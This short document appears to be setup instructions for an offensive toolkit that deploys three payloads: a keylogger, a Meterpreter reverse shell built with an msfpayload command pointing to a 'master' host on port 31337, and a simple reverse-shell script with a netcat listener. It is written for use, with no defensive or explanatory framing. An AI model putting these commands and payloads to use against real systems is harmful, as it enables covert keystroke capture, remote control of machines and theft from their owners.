Three payloads:

1. Key logger:
Run genkey.sh and put executable daemonl in binaries/payload

2. Meterpreter reverse shell
You need to generate metasploit payload and copy it under tcpsd name in binaries/payload
How to generate? Just run this in Kali Linux, the IP below is the 'master' host, which should run meterpreter
msfpayload linux/x64/shell/reverse_tcp LHOST=192.168.1.1 LPORT=31337 X > tcpsd

3. Simple reverse shell
Just edit binaries/payload/tcpbd.sh file to change IP/port -> Just like in meterpreter, these are the master's parametes
Under master just run 
nc -l 31337
